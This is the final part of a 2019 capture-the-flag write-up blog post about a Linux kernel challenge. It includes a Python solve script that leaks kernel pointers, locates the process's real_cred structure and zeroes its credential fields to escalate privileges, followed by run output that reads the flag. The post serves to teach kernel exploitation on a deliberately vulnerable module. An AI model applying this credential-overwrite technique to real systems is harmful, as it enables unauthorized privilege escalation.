+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;power level is: &#39;</span><span class=p>)</span>
+<span class=n>v</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>current_task_ptr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;Found current_task pointer: 0x</span><span class=si>{:x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>current_task_ptr</span><span class=p>))</span>
+
+<span class=c1># 2. Get real_cred_ptr</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
+<span class=n>pl</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>current_task_ptr</span> <span class=o>+</span> <span class=n>real_cred_offset</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>pl</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;power level is: &#39;</span><span class=p>)</span>
+<span class=n>v</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>real_cred_ptr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;Found real_cred pointer: 0x</span><span class=si>{:x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>real_cred_ptr</span><span class=p>))</span>
+
+<span class=c1># 3. Overwrite everything with 0</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
+<span class=n>addr</span> <span class=o>=</span> <span class=n>real_cred_ptr</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>+</span> <span class=mi>8</span><span class=o>*</span><span class=mi>3</span> <span class=c1># 4 for usage, 8 for uid/gid, 8 for suig/sgid, 8 for euid,guid</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{:x}</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+
+<span class=c1># 4. Get userid</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>userid</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;USER: </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>userid</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()))</span>
+
+<span class=c1># 5. Go interactive</span>
+<span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv_all</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+<span class=n>s</span><span class=o>.</span><span class=n>interact</span><span class=p>()</span>
+</pre></div> <p>Let's run it:</p> <div class=codehilite><pre><span></span>$ python solve.py
+<span class=o>[</span>+<span class=o>]</span> Extracting symbols information from the binary...
+<span class=o>[</span>+<span class=o>]</span> Found current_task: 0xffffffff8183a040
+<span class=o>[</span>+<span class=o>]</span> Found commit_creds: 0xffffffff81050c50
+<span class=o>[</span>+<span class=o>]</span> Found real_cred_offset: 0x3f8
+-------------------
+<span class=o>[</span>+<span class=o>]</span> Connecting to remote VM...
+<span class=o>[</span>+<span class=o>]</span> VM Started!
+<span class=o>[</span>+<span class=o>]</span> Found current_task pointer: 0xffff888003373480
+<span class=o>[</span>+<span class=o>]</span> Found real_cred pointer: 0xffff888003382480
+<span class=o>[</span>+<span class=o>]</span> USER: <span class=nv>uid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span>
+----- Menu -----
+<span class=m>1</span>. Read
+<span class=m>2</span>. Write
+<span class=m>3</span>. Show me my uid
+<span class=m>4</span>. Read file
+<span class=m>5</span>. Any hintz?
+<span class=m>6</span>. Bye!
+&gt; <span class=m>4</span>
+<span class=m>4</span>
+Which file are we trying to read?
+&gt; /flag
+/flag
+Here are your 0x10 bytes contents:
+flag<span class=o>{</span>fake_flag<span class=o>}</span>
+
+----- Menu -----
+<span class=m>1</span>. Read
+<span class=m>2</span>. Write
+<span class=m>3</span>. Show me my uid
+<span class=m>4</span>. Read file
+<span class=m>5</span>. Any hintz?
+<span class=m>6</span>. Bye!
+&gt; <span class=m>6</span>
+<span class=m>6</span>
+flux_baby_2 closed
+Bye!
+ACPI: Preparing to enter system sleep state S5
+reboot: Power down
+*** Connection closed by remote host ***
+</pre></div> <p>Et voilà! Fun fact: as we only overwrite <code>fsuid</code>, when the <code>id</code> command is triggered, our <code>uid</code> and <code>gid</code> are still set to <code>user</code> (1000). However since we only want to access the file system, it is enough to read the file <code>/flag</code> and retrieve it.</p> <h2>Conclusion</h2> <p>I'd like to thank the creator of the challenge, as it was a nice way to get back to kernel exploitation.</p> </article> <hr> </main> <footer> 2019 - Antide Petit aka <a href=/ >xarkes</a> - Made with love </footer> </body> </html> 
